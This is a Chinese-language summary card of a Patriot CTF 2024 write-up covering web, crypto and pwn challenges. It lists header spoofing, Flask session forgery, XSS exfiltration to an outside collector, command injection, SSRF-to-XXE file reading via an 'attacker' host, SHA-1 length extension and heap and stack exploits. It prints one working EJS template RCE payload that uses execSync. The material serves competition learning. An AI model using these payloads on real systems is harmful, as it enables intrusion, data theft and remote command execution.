---
title: "Patriot CTF 2024 WriteUp"
category: web
tags: ["Patriot CTF 2024", "web", "flask", "xss", "csrf", "session-forge"]
signals: ["Patriot CTF 2024 2024", "flask", "xss", "csrf", "session-forge", "xxe", "ejs-rce", "sha1-extension", "largebin-attack", "ssti", "Patriot", "CTF", "Web", "X-Forwarded"]
difficulty: hard
source: "https://www.ctfiot.com/206569.html"
tools: ["Flask"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# Patriot CTF 2024 WriteUp

> 赛事：Patriot CTF 2024 2024 | 方向：web | 难度：hard | 工具：Flask

## 一句话总结

Patriot CTF 2024 狼组 WP 大全：Web (X-Forwarded/Session 伪造/XSS/XXE/EJS RCE) + Crypto (SHA-1 长度扩展) + Pwn (栈溢出/largebin/非栈 fmt)。

## 攻击链

1. giraffe notes: 加 X-Forwarded-For: 127.0.0.1 即拿 flag
2. Impersonate: server_start_str="20240921153014" 派生 secret_key=sha256
3. /status 拿当前时间 → 算 10 分钟内 server_start_str → 伪造 admin session
4. Open Seasame: username 字段 XSS 让 adminbot 访问 /api/cal
5. XMLHttpRequest withCredentials 拿 /api/cal 响应 → pipedream 外带
6. /api/cal?modifier=|cat flag.txt 触发命令执行
7. Dogdays: SHA-1 length extension attack 改 view.php?pic=&hash=
8. 自实现 SHA-1 rotl + add + f/K 常量 + 块 1=1.png 块 2=/../../../flag
9. Domdom: SSRF url=http://attacker/get-json 拿 XXE 注入 DOCTYPE 读 file:///app/flag.txt
10. Blob: EJS 模板 RCE ?settings[view options][client]=1&settings[view options][escape]={}.constructor.constructor(...)
11. Not So Shrimple Is Pwn: 简单栈溢出写 retaddr=0x401282 走 cool... 路径
12. Shellcrunch: XOR 编码绕过 + jmp rsp 重定位 + 自构造 read syscall 注入 shellcode
13. Navigator: setpin 负索引越界 + viewpin 泄 canary+libc+pie 逐字节爆破
14. Flight Script Pwn: largebin attack 改 loglen → 溢出 0x118 后 ret2libc
15. Strings Only: 非栈上 fmt-string 多次 sendline 拼 %p 泄地址

## 关键 payload

```
ejs poc=settings[view options][escape]={}.constructor.constructor("return process.mainModule.require('child_process').execSync('cat flag-6637c8dd34.txt')")
```

## 经验教训

Flask session secret_key 与启动时间挂钩可爆破；X-Forwarded-For 是入门级 IP 伪造；EJS settings[view options][escape] 是 RCE 高危面；largebin attack 写全局变量是 ret2libc 前置；SHA-1 长度扩展可绕过 secret 中间校验。

## 标签

flask、xss、csrf、session-forge、xxe、ejs-rce、sha1-extension、largebin-attack、fmt-string、ret2libc、blind

## 参考来源

- https://www.ctfiot.com/206569.html
- 原文件：Patriot_CTF_·_2024_WriteUp.full.md
